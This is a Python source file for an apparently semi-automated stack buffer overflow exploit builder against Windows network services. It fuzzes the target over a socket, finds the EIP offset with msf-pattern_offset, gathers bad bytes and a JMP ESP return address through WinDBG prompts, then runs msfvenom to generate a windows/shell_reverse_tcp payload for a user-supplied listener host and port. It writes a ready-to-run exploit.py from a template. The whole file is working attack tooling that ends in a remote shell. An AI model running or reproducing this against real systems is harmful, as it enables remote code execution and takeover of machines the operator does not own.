import socket
from subprocess import check_output

from Utils.FancyPrint import fancy_print
from Utils.MsgEnums import MsgEnums
from Utils.GetInput import get_register, restart_service, confirmation, get_ip, get_port
from Utils.SocketFuzzer import socket_fuzz
from Utils.HexUtils import convert_from_ascii, value_to_hex, hex_to_little_endian

class CreateExploit():
    """
    """
    def __init__(self, target:tuple):
        """
        """
        # Connection
        self.ip = target.ip 
        self.port = target.port
        self.rqst_type = target.type
        self.fuzz_amount = target.fuzz_amount
        # Overflow
        self.eip = ""
        self.offset = 0
        self.prefix = target.prefix
        self.eip_value = b"\x42\x42\x42\x42" # BBBB by default
        self.eip_value_clean = ""
        self.bad_bytes = "\\x00"
        self.crashed = False
        self.got_bad_bytes = False
        # Misc
        self.verbose = target.verbose
        self.byte_string = ''.join([chr(byte) for byte in range(1, 256)])
    
    def __init_fuzz(self):
        """
        """
        # For current DEBUG assuming msf-pattern_create & msf-pattern_offset are usable
        self.offset = socket_fuzz(self.ip, self.port, self.fuzz_amount, self.prefix)
        self.crashed = True

    def __send_data(self, data):
        """
        """
        timeout = 5
        send_string = self.prefix + data
        if(self.verbose): print(f"Sending: {send_string}")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((self.ip, self.port))
                s.recv(1024)
                s.send(bytes(send_string, "latin-1"))
                s.recv(1024)
        except:
            self.crashed = True
            fancy_print("Service appears to have crashed/not running!", msg_type=MsgEnums.INFO.value)


    def __get_offset(self):
        """
        """
        self.eip = get_register("EIP")

        # Turns out you don't need -l in offset.... thats dandy!
        output = check_output(f"msf-pattern_offset -q {self.eip}", shell=True).decode()
        self.offset = int(output.split(' ')[-1].strip())
        fancy_print("Offset Found!", self.offset, MsgEnums.INFO.value)


    def __check_offset(self) -> bool:
        """
        """
        pre_string = "A" * self.offset #0x41
        data = pre_string + self.eip_value.decode("latin-1")
        self.__send_data(data)

        try:
            fancy_print(f"Is EIP equal to {convert_from_ascii(self.eip_value.decode())}?", msg_type=MsgEnums.QUESTION)
        except:
            fancy_print(f"Did the Breakpoint trigger?", msg_type=MsgEnums.QUESTION)

        return confirmation()
    
    def __create_breakpoint(self):
        """
        """
        # THERE WILL BE MORE TO THIS ONCE I ADD OTHER DEBUGGERS
        fancy_print("Create Breakpoint:", f"bp {self.eip_value_clean}")
        fancy_print("Once done press Enter!", msg_type=MsgEnums.QUESTION.value, endl="")
        input()


    def __get_bad_bytes(self):
        """
        """
        pre_string = "A" * self.offset #0x41
        data = pre_string + self.eip_value.decode("latin-1")
        data = data + self.byte_string

        self.__send_data(data)
        fancy_print("In WinDBG Please Run: ", "db esp - 10 L110", MsgEnums.INFO.value)
        fancy_print("Enter any bad bytes seen e.g. 23 3c 83, if none press Enter", msg_type=MsgEnums.INFO.value)
        bad_bytes = input()
        bad_bytes = bad_bytes.split(' ')

        # Remove bad bytes from byte_string and add to bad_bytes
        if(bad_bytes[0] == ''):
            self.got_bad_bytes = True
        else:
            for bbyte in bad_bytes:
                print(bbyte)
                self.byte_string = self.byte_string.replace(chr(int(bbyte, 16)), "")
                self.bad_bytes += f"\\x{bbyte}"
        print(self.bad_bytes)


    def __get_jmpeax(self):
        """
        """
        # THIS IS THE WINGDBG VERSION THERE WILL BE MORE, NEED TO MAKE MODULE
        fancy_print("In WinDBG Please Run: ", "lm", MsgEnums.INFO.value)
        fancy_print("Go Through Each Module with the following format\n \
                    s -b <NUM1> <NUM2> 0xFF 0xE4 \n \
                    e.g: \n \
                    62500000 62508000   essfunc    (deferred)\n \
                    s -b 62500000 62508000 0xFF 0xE4", msg_type=MsgEnums.INFO.value)
        fancy_print("Pick one of the addresses .e.g: 625011af (on the left)", msg_type=MsgEnums.INFO.value)
        self.eip_value_clean = get_register("address")

        self.eip_value = value_to_hex(self.eip_value_clean)

    

        


    def __create_script(self):
        lhost = get_ip()
        lport = str(get_port())
        payload = check_output(f"msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} EXITFUNC=thread -b '{self.bad_bytes}' -v payload -f py", shell=True).decode()

        with open("Templates/SocketExploit.py", 'r') as file:
            data = file.read()

        new_script = data.replace("IP_HERE", '"' + self.ip + '"')
        new_script = new_script.replace("PORT_HERE", str(self.port))
        new_script = new_script.replace("PREFIX_HERE", 'b"' + self.prefix + '"')
        new_script = new_script.replace("OFFSET_HERE", str(self.offset))
        new_script = new_script.replace("RETURN_HERE", 'b"' + hex_to_little_endian(self.eip_value_clean) + '"')
        new_script = new_script.replace("PAYLOAD_HERE", payload)

        with open("exploit.py", "w") as file:
            file.write(new_script)



                    


    def start(self):
        """
        """

        self.__init_fuzz()
        if(self.crashed):
            self.__get_offset()
            restart_service()
            self.__check_offset()
            restart_service()
            while not (self.got_bad_bytes):
                self.__get_bad_bytes()
                restart_service()
            self.__get_jmpeax()
            restart_service()
            self.__create_breakpoint()
            
            
            if(self.__check_offset()):
                self.__create_script()




